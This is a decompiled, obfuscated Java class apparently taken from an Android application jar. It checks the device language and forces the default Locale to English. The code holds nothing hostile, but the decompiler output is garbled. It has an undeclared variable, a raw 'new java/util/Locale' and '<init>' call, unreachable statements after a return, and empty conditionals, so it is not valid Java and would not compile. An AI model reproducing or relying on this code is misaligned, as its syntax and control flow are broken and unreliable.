package com.vvt.s;

import java.util.Locale;

public class a {
    private static boolean a = com.vvt.ak.a.a;
    private static boolean b = com.vvt.ak.a.b;
    private static boolean c = com.vvt.ak.a.e;

    public static void a() {
        bool = a;
        if (bool) {}
        for (;;) {
            try {
                bool = Locale.getDefault().getLanguage().equalsIgnoreCase(Locale.ENGLISH.getLanguage());
                if (!bool) {
                    continue;
                }

                bool = b;
                if (!bool) {}
            } finally {
                Object localObject1;
                Object localObject3;
                bool = c;
                if (!bool) {
                    continue;
                }
                continue;
            }

            bool = a;
            if (bool) {}
            return;
            localObject1 = new java/util/Locale;
            localObject3 = "en";
            ((Locale)localObject1).<init>((String)localObject3);
            Locale.setDefault((Locale)localObject1);
            bool = b;
            if (!bool) {}
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/s/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */